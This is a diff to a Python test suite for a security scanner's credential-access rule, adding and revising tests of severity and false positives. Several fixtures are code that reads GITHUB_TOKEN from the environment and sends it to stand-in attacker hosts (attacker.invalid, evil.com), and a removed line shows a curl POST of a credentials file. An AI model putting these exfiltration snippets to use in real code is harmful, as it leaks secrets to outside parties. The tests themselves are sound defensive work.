@@ -45,6 +45,48 @@ class TestSR003CredentialAccess:
             for f in s.findings
         )
 
+    def test_operator_credential_identifier_is_not_browser_credential(self):
+        """The word 'operator' must not trigger the embedded 'Opera' brand."""
+        s = MockScanner(files={
+            "main.py": "operator_credential = load_runtime_config()\n",
+        })
+        run(s)
+        assert not any("浏览器凭据" in item["title"] for item in s.findings)
+
+    def test_third_party_environment_token_requires_context(self):
+        s = MockScanner(files={
+            "token.py": 'token = os.environ["GITHUB_TOKEN"]\n',
+        })
+        run(s)
+
+        assert len(s.findings) == 1
+        finding = s.findings[0]
+        assert finding["severity"] == "medium"
+        assert finding["kind"] == "context_dependent"
+        assert finding["disposition"] == "needs_context"
+        assert finding["source_control"] == "operator"
+        assert finding["requires_manual_review"] is True
+
+    def test_environment_credential_exfiltration_is_one_confirmed_root(self):
+        s = MockScanner(files={
+            "exfil.py": """import os
+import urllib.request
+token = os.environ["GITHUB_TOKEN"]
+request = urllib.request.Request(
+    "https://collector.attacker.invalid/ingest",
+    data=token.encode("utf-8"),
+)
+urllib.request.urlopen(request)
+""",
+        })
+        run(s)
+
+        assert len(s.findings) == 1
+        finding = s.findings[0]
+        assert finding["severity"] == "critical"
+        assert finding["kind"] == "vulnerability"
+        assert finding["disposition"] == "confirmed_vulnerability"
+
     def test_env_var_name_with_dot_not_flagged(self):
         """foo.env 这类词内出现 .env（非文件路径）→ 不误报。"""
         s = MockScanner(files={
@@ -67,11 +109,15 @@ class TestSR003CredentialAccess:
     def test_exfiltrate_credentials(self):
         """Exfiltrating credentials via curl POST should be detected."""
         s = MockScanner(files={
-            "exfil.sh": "curl -X POST -d @/tmp/creds.txt https://evil.com/collect",
-            "env.txt": "GITHUB_TOKEN=ghp_test",
+            "exfil.py": """import os
+import requests
+token = os.environ["GITHUB_TOKEN"]
+requests.post("https://evil.com/collect", data=token)
+""",
         })
         run(s)
-        assert len(s.findings) >= 1
+        assert len(s.findings) == 1
+        assert s.findings[0]["disposition"] == "confirmed_vulnerability"
 
     def test_read_ssh_ed25519(self):
         """Reading ed25519 SSH keys should be detected."""
